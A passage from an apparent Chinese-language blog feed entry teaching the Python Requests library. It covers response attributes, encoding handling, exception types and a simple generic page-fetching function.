align="center">HTTP响应头</td></tr><tr><td align="center">r.status_code</td><td align="center">HTTP请求的返回状态，200表示连接成功，404表示失败</td></tr><tr><td align="center">r.text</td><td align="center">HTTP响应内容的字符串形式，即url对应的页面内容</td></tr><tr><td align="center">r.encoding</td><td align="center">从HTTP header中猜测的响应内容编码方式</td></tr><tr><td align="center">r.apparent_encoding</td><td align="center">从内容中分析出的响应内容编码方式（备选编码方式）</td></tr><tr><td align="center">r.content</td><td align="center">HTTP响应内容的二进制形式</td></tr></tbody></table><h3 id="编码问题"><a href="#编码问题" class="headerlink" title="编码问题"></a>编码问题</h3><p>爬取中文页面时特别注重编码问题<br>r.encoding是从charset中判断编码，若头中没有则认为编码是ISO‐8859‐1<br>r.apparent_encoding则是从内容中分析出编码方式<br>所以一般都可以这么写</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r.encoding = r.apparent_encoding</span><br></pre></td></tr></table></figure><p>当然也可以自己指定</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r.encoding = <span class="string">&#x27;utf-8&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="异常"><a href="#异常" class="headerlink" title="异常"></a>异常</h2><h3 id="Requests异常"><a href="#Requests异常" class="headerlink" title="Requests异常"></a>Requests异常</h3><table><thead><tr><th align="center">异常</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">requests.ConnectionError</td><td align="center">网络连接错误异常，如DNS查询失败、拒绝连接等</td></tr><tr><td align="center">requests.HTTPError</td><td align="center">HTTP错误异常</td></tr><tr><td align="center">requests.URLRequiredURL</td><td align="center">缺失异常</td></tr><tr><td align="center">requests.TooManyRedirects</td><td align="center">超过最大重定向次数，产生重定向异常</td></tr><tr><td align="center">requests.ConnectTimeout</td><td align="center">连接远程服务器超时异常</td></tr><tr><td align="center">requests.Timeout</td><td align="center">请求URL超时，产生超时异常</td></tr></tbody></table><h3 id="Response异常"><a href="#Response异常" class="headerlink" title="Response异常"></a>Response异常</h3><p>r.raise_for_status()<br>当状态码不是200时都会产生requests.HTTPError异常</p><h3 id="处理"><a href="#处理" class="headerlink" title="处理"></a>处理</h3><p>爬网页应该是准确的，所以来个302跳转都不行<br>而且”网络连接有风险，异常处理很重要”</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    r = requests.get(url)</span><br><span class="line">    r.raise_for_status()</span><br><span class="line">    r.encoding = r.apparent_encoding</span><br><span class="line">    <span class="keyword">return</span> r.text</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;异常&quot;</span></span><br></pre></td></tr></table></figure><h2 id="通用爬取框架"><a href="#通用爬取框架" class="headerlink" title="通用爬取框架"></a>通用爬取框架</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getHTMLText</span>(<span class="params">url</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = requests.get(url)</span><br><span class="line">        r.raise_for_status()</span><br><span class="line">        r.encoding = r.apparent_encoding</span><br><span class="line">        <span class="keyword">return</span> r.text</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;异常&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    url=<span class="string">&quot;https://www.baidu.com&quot;</span></span><br><span class="line">    print(getHTMLText(url))</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Requests库&quot;&gt;&lt;a href=&quot;#Requests库&quot; class=&quot;headerlink&quot; title=&quot;Requests库&quot;&gt;&lt;/a&gt;Requests库&lt;/h1&gt;&lt;h2 id=&quot;7个主要方法&quot;&gt;&lt;a href=&quot;#7个主要方法&quot; class=&quot;headerlink&quot; title=&quot;7个主要方法&quot;&gt;&lt;/a&gt;7个主要方法&lt;/h2&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align=&quot;center&quot;&gt;方法&lt;/th&gt;
&lt;th align=&quot;center&quot;&gt;说明&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;requests.request()&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;构造一个请求，支撑以下各方法的基础方法&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;requests.get()&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;获取HTML网页的主要方法，对应于HTTP的GET&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;requests.head()&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;获取HTML网页头信息的方法，对应于HTTP的HEAD&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;requests.post()&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;向HTML网页提交POST请求的方法，对应于HTTP的POST&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;requests.put()&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;向HTML网页提交PUT请求的方法，对应于HTTP的PUT&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;requests.patch()&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;向HTML网页提交局部修改请求，对应于HTTP的PATCH&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;requests.delete()&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;向HTML页面提交删除请求，对应于HTTP的DELETE&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt;与HTTP协议一一对应  &lt;/p&gt;</summary>
    
    
    
    <category term="Python" scheme="https://sncker.github.io/blog/categories/Python/"/>
    
    <category term="爬虫" scheme="https://sncker.github.io/blog/categories/Python/%E7%88%AC%E8%99%AB/"/>
    
    
  </entry>
  
</feed>
